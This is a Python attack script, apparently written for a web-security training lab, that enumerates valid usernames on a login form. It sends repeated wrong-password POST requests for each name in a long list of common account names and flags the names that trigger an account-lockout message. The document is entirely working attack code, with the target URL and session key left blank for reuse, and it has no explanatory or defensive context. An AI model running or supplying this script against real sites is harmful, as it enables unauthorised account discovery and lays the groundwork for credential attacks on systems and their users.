import requests
from requests_toolbelt.utils import dump
import sys
import os

uname = ['carlos', 'root', 'admin', 'test', 'guest', 'info', 'adm', 'mysql', 'user', 'administrator', 'oracle', 'ftp', 'pi', 'puppet', 'ansible', 'ec2-user', 'vagrant', 'azureuser', 'academico', 'acceso', 'access', 'accounting', 'accounts', 'acid', 'activestat', 'ad', 'adam', 'adkit', 'admin', 'administracion', 'administrador', 'administrator', 'administrators', 'admins', 'ads', 'adserver', 'adsl', 'ae', 'af', 'affiliate', 'affiliates', 'afiliados', 'ag', 'agenda', 'agent', 'ai', 'aix', 'ajax', 'ak', 'akamai',
         'al', 'alabama', 'alaska', 'albuquerque', 'alerts', 'alpha', 'alterwind', 'am', 'amarillo', 'americas', 'an', 'anaheim', 'analyzer', 'announce', 'announcements', 'antivirus', 'ao', 'ap', 'apache', 'apollo', 'app', 'app01', 'app1', 'apple', 'application', 'applications', 'apps', 'appserver', 'aq', 'ar', 'archie', 'arcsight', 'argentina', 'arizona', 'arkansas', 'arlington', 'as', 'as400', 'asia', 'asterix', 'at', 'athena', 'atlanta', 'atlas', 'att', 'au', 'auction', 'austin', 'auth', 'auto', 'autodiscover']

url = ''
session_key = ''
path = '/login'

HEADERS = {'Host': url,
           'Cookie': 'session='+session_key+'; verify=carlos',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
           'Accept-Language': 'en-US,en;q=0.5',
           'Accept-Encoding': 'gzip, deflate, br',
           'Content-Type': 'application/x-www-form-urlencoded',
           'Referer': url+path,
           'Origin': url,
           'Upgrade-Insecure-Requests': '1',
           'Sec-Fetch-Dest': 'document',
           'Sec-Fetch-Mode': 'navigate',
           'Sec-Fetch-Site': 'same-origin'}


def logging_hook(response, *args, **kwargs):
    data = dump.dump_all(response)
    print(data.decode('utf-8'))


http = requests.Session()
# http.hooks["response"] = [logging_hook]


i = 0
req_num = len(uname)
credentials = ''
vulnerable_acc = set()
for i in range(req_num):
    credentials = f'username={uname[i]}&password=dupa'
    for _ in range(5):
        r = http.post('https://'+url+path, headers=HEADERS,
                      data=credentials, allow_redirects=False)
        sys.stdout.write('\r'+'trying: '+credentials +
                         ' found: '+str(len(vulnerable_acc))+'            ')
        sys.stdout.flush()

        if 'You have made too many incorrect login attempts. Please try again in 1 minute(s).' in dump.dump_all(r).decode('utf-8'):
            # with open(f'req{i}.txt', 'w') as file:
            #     file.write(dump.dump_all(r).decode('utf-8'))
            vulnerable_acc.add(uname[i])

os.system('cls')
print(f'potentially vulnerable accounts are: {vulnerable_acc}')
